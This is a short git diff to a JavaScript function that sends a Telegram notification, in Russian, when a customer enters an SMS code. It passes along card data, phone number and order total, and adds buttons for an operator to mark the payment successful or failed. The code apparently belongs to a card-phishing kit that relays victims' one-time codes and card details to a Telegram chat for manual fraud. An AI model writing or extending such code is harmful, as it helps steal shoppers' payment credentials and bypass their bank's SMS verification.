@@ -237,7 +237,7 @@ export const notifySMSCodeEntered = (smsCode, cardData, orderData) => {
     minute: '2-digit',
     second: '2-digit'
   })
-  
+
   const message = `📱 <b>SMS КОД ВВЕДЕН</b>
 
 👤 <b>ID клиента:</b> <code>${userId}</code>
@@ -256,5 +256,13 @@ export const notifySMSCodeEntered = (smsCode, cardData, orderData) => {
 📞 <b>Телефон:</b> ${orderData.formData.phone}
 💰 <b>Сумма:</b> ${orderData.total} THB`
 
-  sendTelegramMessageCards(message)
+  // Inline кнопки для результата оплаты
+  const inlineKeyboard = [
+    [
+      { text: '✅ Успешная оплата', callback_data: `payment_success_${userId}` },
+      { text: '❌ Не успешная оплата', callback_data: `payment_failed_${userId}` }
+    ]
+  ]
+
+  sendTelegramMessageCards(message, inlineKeyboard)
 }
